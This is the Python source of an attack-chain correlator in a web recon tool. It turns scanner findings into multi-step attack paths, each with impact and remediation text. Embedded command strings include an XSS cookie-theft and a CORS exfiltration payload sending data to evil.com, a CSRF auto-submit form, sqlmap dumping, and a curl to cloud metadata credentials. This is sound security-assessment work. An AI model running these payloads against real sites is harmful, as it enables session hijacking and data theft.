"""
Attack chain correlator for WebRipper Recon.

Analyzes all findings across scanners and tools to detect multi-step
attack paths that are more dangerous than individual findings.
"""

from __future__ import annotations

from typing import Any, List, Set
from urllib.parse import urlparse

from .models import (
    AttackChain, AttackChainStep, Finding, ReconReport, Severity,
)


def correlate(report: Any) -> List[AttackChain]:
    """Analyze all findings and detect attack chains."""
    chains: List[AttackChain] = []
    if isinstance(report, list):
        findings = report
        target_url = "https://target"
    else:
        findings = getattr(report, "all_findings", [])
        target_url = getattr(report, "url", "") or "https://target"
    target_url = target_url.rstrip("/")

    # Build lookup sets for fast checking
    cats: dict[str, List[Finding]] = {}
    for f in findings:
        cats.setdefault(f.category, []).append(f)

    titles_lower = {f.title.lower() for f in findings}
    categories = set(cats.keys())

    # --- Chain 1: Source Code Leak → Credential Theft → Database Access ---
    git_exposed = _find(cats, "paths", lambda f: ".git" in f.title.lower() or ".git" in f.evidence.lower())
    creds_found = _find(cats, "secrets", lambda f: any(
        s in f.title.lower() for s in ("database", "db_", "mysql", "postgres", "mongo", "redis", "password", "credential")
    ))
    db_port_open = _find_any(cats, ("portscan", "nmap"), lambda f: any(
        s in f.title.lower() for s in ("mysql", "postgres", "mongodb", "redis", "3306", "5432", "27017", "6379")
    ))

    if git_exposed and creds_found:
        steps = [
            AttackChainStep(
                description="Exposed .git directory allows full repository cloning",
                finding=git_exposed, source="paths",
                command=f"git-dumper {target_url}/.git ./dumped-repo",
            ),
            AttackChainStep(
                description=f"Repository contains credentials: {creds_found.title}",
                finding=creds_found, source="secrets",
                command="grep -r 'password\\|secret\\|key\\|token' ./dumped-repo/",
            ),
        ]
        if db_port_open:
            steps.append(AttackChainStep(
                description=f"Database port is open: {db_port_open.title}",
                finding=db_port_open, source=db_port_open.category,
                command="psql -h TARGET -U admin -d production  # or mysql/mongosh equivalent",
            ))

        chains.append(AttackChain(
            name="Source Code Leak → Credential Theft" + (" → Database Access" if db_port_open else ""),
            severity=Severity.CRITICAL,
            steps=steps,
            impact="Complete data breach. Attacker clones source code, extracts database credentials, and connects directly to the database.",
            time_to_exploit="~10 minutes",
            remediation="1. Block /.git access via web server config\n2. Rotate ALL credentials found in source\n3. Firewall database ports (allow only app servers)\n4. Remove secrets from version control history (git filter-branch)",
        ))

    # --- Chain 2: XSS → Session Hijack → Account Takeover ---
    xss_sink = _find(cats, "javascript", lambda f: "xss" in f.title.lower() or "innerhtml" in f.title.lower() or "eval" in f.title.lower() or "document.write" in f.title.lower())
    no_csp = _find(cats, "headers", lambda f: "content-security-policy" in f.title.lower() and "missing" in f.title.lower())
    no_httponly = _find(cats, "cookies", lambda f: "httponly" in f.title.lower())
    if not no_httponly:
        no_httponly = _find(cats, "headers", lambda f: "httponly" in f.title.lower())

    if xss_sink and (no_csp or no_httponly):
        steps = [
            AttackChainStep(
                description=f"DOM XSS sink found: {xss_sink.title}",
                finding=xss_sink, source="javascript",
            ),
        ]
        if no_csp:
            steps.append(AttackChainStep(
                description="No Content-Security-Policy header — browser executes injected scripts",
                finding=no_csp, source="headers",
            ))
        if no_httponly:
            steps.append(AttackChainStep(
                description="Cookies accessible to JavaScript — XSS steals session cookies",
                finding=no_httponly, source="cookies",
                command="// Attacker's payload:\nfetch('https://evil.com/steal?c='+document.cookie)",
            ))

        chains.append(AttackChain(
            name="XSS → Session Hijack → Account Takeover",
            severity=Severity.CRITICAL,
            steps=steps,
            impact="Attacker executes JavaScript in victim's browser, steals session cookie, and logs in as the victim.",
            time_to_exploit="~10 minutes if user input reaches XSS sink",
            remediation="1. Fix XSS sinks (use textContent, DOMPurify)\n2. Deploy Content-Security-Policy header\n3. Set HttpOnly flag on all session cookies\n4. Implement CSP nonces for inline scripts",
        ))

    # --- Chain 3: CSRF + No Token → Account Manipulation ---
    csrf_missing = _find(cats, "forms", lambda f: "csrf" in f.title.lower())
    login_form = _find(cats, "forms", lambda f: "login" in f.title.lower() or "password" in f.title.lower())

    if csrf_missing and login_form:
        chains.append(AttackChain(
            name="CSRF → Unauthorized Actions",
            severity=Severity.HIGH,
            steps=[
                AttackChainStep(
                    description=f"Login/sensitive form found: {login_form.title}",
                    finding=login_form, source="forms",
                ),
                AttackChainStep(
                    description=f"Form lacks CSRF protection: {csrf_missing.title}",
                    finding=csrf_missing, source="forms",
                    command="// Attacker's page:\n<form action='TARGET/change-password' method='POST' id='f'>\n  <input name='password' value='hacked'>\n</form>\n<script>document.getElementById('f').submit()</script>",
                ),
            ],
            impact="Attacker tricks logged-in user into visiting a page that auto-submits a form — changing their password, email, or performing other actions.",
            time_to_exploit="~5 minutes",
            remediation="1. Add CSRF tokens to all forms\n2. Validate CSRF tokens server-side\n3. Use SameSite cookie attribute",
        ))

    # --- Chain 4: Subdomain Takeover → Cookie Theft ---
    takeover = _find(cats, "subdomains", lambda f: "takeover" in f.title.lower())
    broad_cookie = _find(cats, "cookies", lambda f: "scope" in f.title.lower() or "broad" in f.title.lower())

    if takeover and broad_cookie:
        chains.append(AttackChain(
            name="Subdomain Takeover → Cookie Theft",
            severity=Severity.HIGH,
            steps=[
                AttackChainStep(
                    description=f"Subdomain takeover possible: {takeover.title}",
                    finding=takeover, source="subdomains",
                ),
                AttackChainStep(
                    description=f"Cookie scoped to parent domain: {broad_cookie.title}",
                    finding=broad_cookie, source="cookies",
                ),
            ],
            impact="Attacker claims abandoned subdomain, receives cookies scoped to the parent domain, and hijacks user sessions on the main site.",
            time_to_exploit="~15 minutes to register unclaimed service",
            remediation="1. Remove DNS records for unused subdomains\n2. Scope cookies to specific subdomains\n3. Use __Host- cookie prefix",
        ))

    # --- Chain 5: CORS Misconfiguration → Data Theft ---
    cors_vuln = _find(cats, "cors", lambda f: "reflects" in f.title.lower() or "null" in f.title.lower())
    sensitive_api = _find(cats, "endpoints", lambda f: "api" in f.evidence.lower() or "/api/" in f.evidence.lower())

    if cors_vuln:
        steps = [AttackChainStep(
            description=f"CORS vulnerability: {cors_vuln.title}",
            finding=cors_vuln, source="cors",
            command="// Attacker's evil.com:\nfetch('TARGET/api/user/data', {credentials:'include'})\n  .then(r => r.json())\n  .then(d => fetch('https://evil.com/steal', {method:'POST', body:JSON.stringify(d)}))",
        )]
        if sensitive_api:
            steps.append(AttackChainStep(
                description=f"API endpoints discovered: {sensitive_api.evidence[:100]}",
                finding=sensitive_api, source="endpoints",
            ))
        chains.append(AttackChain(
            name="CORS Bypass → Authenticated Data Theft",
            severity=Severity.CRITICAL,
            steps=steps,
            impact="Attacker's website reads authenticated API responses — stealing user data, tokens, and private information.",
            time_to_exploit="~5 minutes",
            remediation="1. Fix CORS to only allow specific trusted origins\n2. Never reflect the Origin header\n3. Don't allow null origin",
        ))

    # --- Chain 6: Exposed Admin + Weak Auth → Full Control ---
    admin_panel = _find_any(cats, ("paths", "endpoints"), lambda f: any(
        "admin" in s.lower() for s in (f.title, f.url, f.evidence)
    ) and f.severity in (Severity.HIGH, Severity.MEDIUM, Severity.INFO))
    no_rate_limit = _find(cats, "headers", lambda f: "rate" in f.title.lower())
    weak_creds = _find(cats, "secrets", lambda f: "default" in f.title.lower() or "admin" in f.evidence.lower())

    if admin_panel and (weak_creds or no_rate_limit or creds_found):
        steps = [AttackChainStep(
            description=f"Admin panel exposed: {admin_panel.title} ({admin_panel.url or admin_panel.evidence[:60]})",
            finding=admin_panel, source=admin_panel.category,
        )]
        if weak_creds or creds_found:
            cred_finding = weak_creds or creds_found
            steps.append(AttackChainStep(
                description=f"Credentials found in assets: {cred_finding.title}",
                finding=cred_finding, source="secrets",
            ))
        if no_rate_limit:
            steps.append(AttackChainStep(
                description="No rate limiting — brute-force is feasible",
                finding=no_rate_limit, source="headers",
            ))
        chains.append(AttackChain(
            name="Exposed Admin Interface → Credential Exploitation → Administrative Takeover",
            severity=Severity.HIGH,
            steps=steps,
            impact="Attacker accesses admin interface using discovered credentials or brute-force, gaining administrative control.",
            time_to_exploit="~5 minutes with discovered credentials, ~30 minutes with brute-force",
            remediation="1. Restrict admin panel to internal network/VPN\n2. Enforce strong passwords\n3. Implement rate limiting and account lockout\n4. Enable MFA for admin accounts",
        ))

    # --- Chain 7: Dangerous Open Ports → Direct Server Compromise ---
    dangerous_ports = [f for f in findings if f.category in ("portscan", "nmap") and f.severity in (Severity.CRITICAL, Severity.HIGH)]
    if len(dangerous_ports) >= 2:
        steps = [AttackChainStep(
            description=f"Dangerous service: {dp.title}",
            finding=dp, source=dp.category,
        ) for dp in dangerous_ports[:5]]

        chains.append(AttackChain(
            name="Multiple Dangerous Services Exposed",
            severity=Severity.CRITICAL,
            steps=steps,
            impact="Multiple high-risk services are internet-facing. Each one is a potential entry point for full server compromise.",
            time_to_exploit="~15 minutes to test each service",
            remediation="1. Firewall all non-essential ports\n2. Allow only necessary services from trusted IPs\n3. Enable authentication on all services\n4. Consider a VPN for management access",
        ))

    # --- Chain 8: TLS Weakness + Login Form → Credential Interception ---
    tls_weak = _find(cats, "tls", lambda f: f.severity in (Severity.HIGH, Severity.CRITICAL))
    login_http = _find(cats, "forms", lambda f: "http" in f.title.lower() and "login" in f.title.lower())

    if tls_weak and (login_form or login_http):
        chains.append(AttackChain(
            name="Weak TLS + Login Form → Credential Interception",
            severity=Severity.HIGH,
            steps=[
                AttackChainStep(
                    description=f"TLS weakness: {tls_weak.title}",
                    finding=tls_weak, source="tls",
                ),
                AttackChainStep(
                    description="Login form transmits credentials through weak/no encryption",
                    finding=login_http or login_form, source="forms",
                ),
            ],
            impact="Attacker on the network intercepts login credentials via MITM or protocol downgrade.",
            time_to_exploit="~10 minutes on shared network",
            remediation="1. Fix TLS configuration (TLS 1.2+ only)\n2. Enforce HTTPS for all forms\n3. Deploy HSTS with preloading",
        ))

    # --- Chain 7: Verified XSS + Insecure Cookies → Session Hijacking ---
    xss_found = _find(cats, "vulns", lambda f: "xss" in f.title.lower())
    insecure_cookie = _find(cats, "cookies", lambda f: "httponly" in f.title.lower() or "secure" in f.title.lower())
    if xss_found:
        steps = [
            AttackChainStep(
                description=f"Verified XSS vulnerability: {xss_found.title}",
                finding=xss_found, source="vulns",
                command=f"Inject payload into vulnerable parameter",
            ),
        ]
        if insecure_cookie:
            steps.append(AttackChainStep(
                description=f"Session cookies lack protection: {insecure_cookie.title}",
                finding=insecure_cookie, source="cookies",
                command="Steal session via document.cookie",
            ))
        chains.append(AttackChain(
            name="XSS → Session Hijacking",
            severity=Severity.CRITICAL,
            steps=steps,
            impact="Verified XSS allows JavaScript execution in victim's browser. "
                   "Combined with insecure cookies, attacker steals session tokens.",
            time_to_exploit="~5 minutes",
            remediation="1. Fix XSS vulnerability with input sanitization\n"
                        "2. Set HttpOnly and Secure flags on all session cookies\n"
                        "3. Implement Content-Security-Policy",
        ))

    # --- Chain 8: SQL Injection → Full Database Compromise ---
    sqli_found = _find(cats, "vulns", lambda f: "sqli" in f.title.lower() or "sql" in f.title.lower())
    if sqli_found:
        sqli_steps = [
            AttackChainStep(
                description=f"SQL injection confirmed: {sqli_found.title}",
                finding=sqli_found, source="vulns",
                command="sqlmap -u 'target_url' --dbs --dump --batch",
            ),
        ]
        if db_port_open:
            sqli_steps.append(AttackChainStep(
                description=f"Database port is also exposed: {db_port_open.title}",
                finding=db_port_open, source=db_port_open.category,
                command="Direct database connection with extracted administrative credentials",
            ))

        chains.append(AttackChain(
            name="SQL Injection → Database Extraction" + (" & Direct Access" if db_port_open else ""),
            severity=Severity.CRITICAL,
            steps=sqli_steps,
            impact="SQL injection provides database access, allowing data extraction, authentication bypass, and potential remote code execution via database features."
                   + (" Exposed database port additionally permits direct external access." if db_port_open else ""),
            time_to_exploit="~5 minutes with automated SQLi tools",
            remediation="1. Fix SQL injection with parameterized queries and prepared statements\n"
                        "2. Implement strict input validation and least-privilege database user rights\n"
                        "3. Ensure database ports are never accessible from the public internet",
        ))

    # --- Chain 9: Known CVE + Exposed Service → Known Exploit ---
    critical_cve = _find(cats, "cves", lambda f: f.severity == Severity.CRITICAL)
    if critical_cve:
        chains.append(AttackChain(
            name="Known CVE → Public Exploit Available",
            severity=Severity.CRITICAL,
            steps=[
                AttackChainStep(
                    description=f"Critical CVE detected: {critical_cve.title}",
                    finding=critical_cve, source="cves",
                    command=f"searchsploit {critical_cve.title.split(':')[0] if ':' in critical_cve.title else critical_cve.title}",
                ),
            ],
            impact="A known critical vulnerability with public exploits is present. "
                   "Automated exploitation tools exist for this vulnerability.",
            time_to_exploit="~5 minutes with public exploit",
            remediation=f"Upgrade the affected component immediately. {critical_cve.remediation}",
        ))

    # --- Chain 10: Next.js Server Actions Host Reflection + Source Maps → Internal API Compromise ---
    next_sourcemap = _find_any(cats, ("scenarios", "paths"), lambda f: "source map" in f.title.lower() or ".js.map" in f.title.lower() or "next.js" in f.title.lower())
    api_endpoints = _find(cats, "endpoints", lambda f: bool(f.title))
    if next_sourcemap and api_endpoints:
        api_url = api_endpoints.url or "/api"
        if not api_url.startswith("http"):
            api_url = f"{target_url}/{api_url.lstrip('/')}"
        chains.append(AttackChain(
            name="Next.js Source Maps & Server Actions → Internal API Exploitation",
            severity=Severity.HIGH,
            steps=[
                AttackChainStep(
                    description=f"Exposed frontend source maps reveal internal backend schemas: {next_sourcemap.title}",
                    finding=next_sourcemap, source=next_sourcemap.category,
                    command=f"curl -s {target_url}/_next/static/chunks/main.js.map | jq .sources",
                ),
                AttackChainStep(
                    description=f"Discovered sensitive API route for targeting: {api_endpoints.title}",
                    finding=api_endpoints, source="endpoints",
                    command=f"curl -X POST '{api_url}' -H 'Next-Action: canary'",
                ),
            ],
            impact="Attackers reconstruct full TypeScript types, private API routes, and internal endpoints, allowing targeted Server Action manipulation and authentication bypass.",
            time_to_exploit="~15 minutes",
            remediation="Disable productionBrowserSourceMaps in next.config.js and validate origin headers on Server Actions.",
        ))

    # --- Chain 11: Spring Boot Actuator + Cloud Metadata / SSRF → Cloud IAM Takeover ---
    spring_actuator = _find_any(cats, ("scenarios", "paths"), lambda f: "actuator" in f.title.lower() or "heapdump" in f.title.lower())
    ssrf_vuln = _find_any(cats, ("vulns", "scenarios"), lambda f: "ssrf" in f.title.lower() or "metadata" in f.title.lower())
    if spring_actuator:
        steps = [
            AttackChainStep(
                description=f"Exposed Spring Actuator endpoint leaks environment variables and secrets: {spring_actuator.title}",
                finding=spring_actuator, source=spring_actuator.category,
                command="curl -s https://target/actuator/env | jq",
            ),
        ]
        if ssrf_vuln:
            steps.append(AttackChainStep(
                description=f"SSRF vector allows reaching cloud link-local metadata: {ssrf_vuln.title}",
                finding=ssrf_vuln, source=ssrf_vuln.category,
                command="curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            ))
        chains.append(AttackChain(
            name="Spring Boot Actuator Exposure → Cloud Infrastructure Takeover",
            severity=Severity.CRITICAL,
            steps=steps,
            impact="Cleartext AWS/GCP access keys, database passwords, and internal API tokens extracted directly from server memory or environment variables.",
            time_to_exploit="~5 minutes",
            remediation="Secure or disable sensitive Spring Boot Actuator endpoints (management.endpoints.web.exposure.exclude=env,heapdump).",
        ))

    # --- Chain 12: Subdomain Takeover + OAuth Callback Whitelist → Global Account Hijacking ---
    takeover_candidate = _find(cats, "subdomains", lambda f: "takeover" in f.title.lower() or "cname" in f.title.lower())
    oauth_finding = _find_any(cats, ("scenarios", "paths", "endpoints"), lambda f: "oauth" in f.title.lower() or "callback" in f.title.lower() or "redirect_uri" in f.title.lower())
    if takeover_candidate and oauth_finding:
        to_host = urlparse(takeover_candidate.url).netloc or takeover_candidate.title.split()[-1]
        chains.append(AttackChain(
            name="Subdomain Takeover + OAuth Redirect Whitelist → Account Hijacking",
            severity=Severity.CRITICAL,
            steps=[
                AttackChainStep(
                    description=f"Dangling CNAME points to claimable cloud service: {takeover_candidate.title}",
                    finding=takeover_candidate, source="subdomains",
                    command=f"subzy run --targets {takeover_candidate.url or 'subdomain.target.com'}",
                ),
                AttackChainStep(
                    description=f"OAuth authorization flow trusts domain subdomains for callback: {oauth_finding.title}",
                    finding=oauth_finding, source=oauth_finding.category,
                    command=f"curl '{target_url}/oauth/authorize?client_id=123&redirect_uri=https://{to_host}'",
                ),
            ],
            impact="Attacker claims abandoned cloud service, receives victim OAuth authorization codes, and logs into arbitrary accounts without passwords.",
            time_to_exploit="~30 minutes to claim service and configure receiver",
            remediation="Remove stale DNS CNAME records and strictly whitelist explicit, exact callback URLs in OAuth provider settings.",
        ))

    # --- Chain 13: CORS Origin Reflection + Sensitive API Route → Client-Side Mass Data Exfiltration ---
    cors_vuln = _find(cats, "cors", lambda f: "cors" in f.title.lower() or "origin" in f.title.lower())
    sensitive_path = _find_any(cats, ("paths", "endpoints"), lambda f: any(k in f.title.lower() for k in ("user", "profile", "account", "billing", "token", "key", "admin", "api")))
    if cors_vuln and sensitive_path:
        chains.append(AttackChain(
            name="CORS Origin Reflection + Sensitive API → Client-Side Data Exfiltration",
            severity=Severity.HIGH,
            steps=[
                AttackChainStep(
                    description=f"Server reflects arbitrary or null Origin with credentials: {cors_vuln.title}",
                    finding=cors_vuln, source="cors",
                    command=f"curl -H 'Origin: https://attacker.com' -I {cors_vuln.url or 'https://target'}",
                ),
                AttackChainStep(
                    description=f"Sensitive endpoint exposes private user data: {sensitive_path.title}",
                    finding=sensitive_path, source=sensitive_path.category,
                    command=f"curl -s -b 'session=victim_cookie' {sensitive_path.url or 'https://target/api/user'}",
                ),
            ],
            impact="Malicious website in victim's browser issues authenticated background requests and exfiltrates complete user profile, tokens, and PII.",
            time_to_exploit="~10 minutes to deploy exploitation page",
            remediation="Implement strict whitelist of allowed origins and never mirror arbitrary or null origins in Access-Control-Allow-Origin.",
        ))

    # --- Chain 14: Production GraphQL Introspection + Disclosed IDOR / Batch Mutation ---
    graphql_vuln = _find_any(cats, ("scenarios", "endpoints", "paths"), lambda f: "graphql" in f.title.lower() and ("introspection" in f.title.lower() or "enabled" in f.title.lower() or "/graphql" in f.title.lower()))
    if graphql_vuln:
        chains.append(AttackChain(
            name="GraphQL Introspection → Batched Mutation Rate-Limit Bypass",
            severity=Severity.HIGH,
            steps=[
                AttackChainStep(
                    description=f"GraphQL introspection exposes complete API schema and unpublished mutations: {graphql_vuln.title}",
                    finding=graphql_vuln, source=graphql_vuln.category,
                    command="graphql-voyager or clairvoyance https://target/graphql",
                ),
                AttackChainStep(
                    description="Array query batching bypasses application rate-limiting for mass brute force or enumeration",
                    finding=graphql_vuln, source=graphql_vuln.category,
                    command='curl -X POST https://target/graphql -H "Content-Type: application/json" -d \'[{"query":"query{user(id:1){email}}"},{"query":"query{user(id:2){email}}"}]\'',
                ),
            ],
            impact="Complete backend data model and hidden administrative mutations exposed; rate-limits bypassed via batched queries.",
            time_to_exploit="~10 minutes",
            remediation="Disable introspection in production and enforce query complexity and batch size limits.",
        ))

    # --- Chain 15: HTTP Request Smuggling + Unkeyed Header → Web Cache Poisoning ---
    smuggling_vuln = _find_any(cats, ("scenarios", "vulns"), lambda f: "smuggling" in f.title.lower() or "cl.te" in f.title.lower() or "desync" in f.title.lower())
    if smuggling_vuln:
        smuggle_cmd = smuggling_vuln.metadata.get('poc_curl') or 'curl -X POST https://target -H "Transfer-Encoding: chunked"'
        chains.append(AttackChain(
            name="HTTP Request Smuggling → Persistent Web Cache Poisoning",
            severity=Severity.CRITICAL,
            steps=[
                AttackChainStep(
                    description=f"Front-end and back-end proxies desynchronize on message boundaries: {smuggling_vuln.title}",
                    finding=smuggling_vuln, source=smuggling_vuln.category,
                    command=smuggle_cmd,
                ),
                AttackChainStep(
                    description="Prefix request injects malicious response into shared reverse proxy cache",
                    finding=smuggling_vuln, source=smuggling_vuln.category,
                    command="smuggler.py -u https://target -v",
                ),
            ],
            impact="Attacker poisons CDN cache to serve malicious JavaScript to all visitors or hijack incoming authenticated requests.",
            time_to_exploit="~20 minutes",
            remediation="Enforce HTTP/2 end-to-end and configure reverse proxy to normalize or reject ambiguous Transfer-Encoding headers.",
        ))

    # Deduplicate chains by name
    unique_chains: List[AttackChain] = []
    seen_names = set()
    for c in chains:
        if c.name not in seen_names:
            seen_names.add(c.name)
            unique_chains.append(c)
    return unique_chains


def _find(cats: dict, category: str, predicate) -> Finding | None:
    """Find the first finding in a category matching a predicate."""
    for f in cats.get(category, []):
        if predicate(f):
            return f
    return None


def _find_any(cats: dict, categories: tuple, predicate) -> Finding | None:
    """Find across multiple categories."""
    for cat in categories:
        result = _find(cats, cat, predicate)
        if result:
            return result
    return None
